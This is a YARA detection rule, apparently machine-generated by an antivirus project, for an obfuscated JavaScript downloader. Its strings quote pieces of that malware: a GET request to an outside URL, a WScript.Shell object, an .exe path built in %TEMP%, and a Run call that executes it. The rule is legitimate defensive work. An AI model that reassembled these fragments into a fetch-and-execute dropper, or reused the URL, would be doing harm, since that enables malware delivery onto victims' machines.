rule sig_20160330_b82a5c9eb4cf5c1c165334659e91e08f {
  meta:
    description = "datamaliciousorder - file 20160330_b82a5c9eb4cf5c1c165334659e91e08f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0224c760b22cb14c4bb6317a94a45fbcc741f43bc7eeb32d25155eb578f09802"

  strings:
    $s1  = "_I[_U0](\"GET\", \"http://zakazdetali.kz/v7bsad\", false);" fullword ascii
    $s2  = "function _C(_IE, _C0){_T = _T * 1; return _IE - _C0;};" fullword ascii
    $s3  = "var _D = function _JJ() {return WScript[_ET](\"WScript\"+\".Shell\");}(), _A = 11;" fullword ascii
    $s4  = "if (_I[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _AZ(){return _K + \"\";};" fullword ascii
    $s6  = "function _Y() {return _D[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"ezc6Y262ohIWgVGU.ex\" + \"e\";};" fullword ascii
    $s7  = "function _QY(_G){_D[\"Run\"](_G, _T, _T);};" fullword ascii
    $s8  = "function _E() {return ((_OJ == true) && (_OJ == _S0)) ? 1 : _T;};" fullword ascii
    $s9  = "function _U()" fullword ascii
    $s10 = " while (_S){" fullword ascii
    $s11 = "function _P(){return 22;};" fullword ascii
    $s12 = "return _C(_AD, _V);" fullword ascii
    $s13 = "var _OM = new this[\"Date\"]();" fullword ascii
    $s14 = "function _WA(_AZ0) {var _N = (1, 2, 3, 4, 5, _AZ0); return _N;};" fullword ascii
    $s15 = "function _RI(){return _ET;};" fullword ascii
    $s16 = "var _S0 = false;" fullword ascii
    $s17 = "_S0 = true; " fullword ascii
    $s18 = "var _OJ = false;" fullword ascii
    $s19 = "_OJ = true; " fullword ascii
    $s20 = "var _NA = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}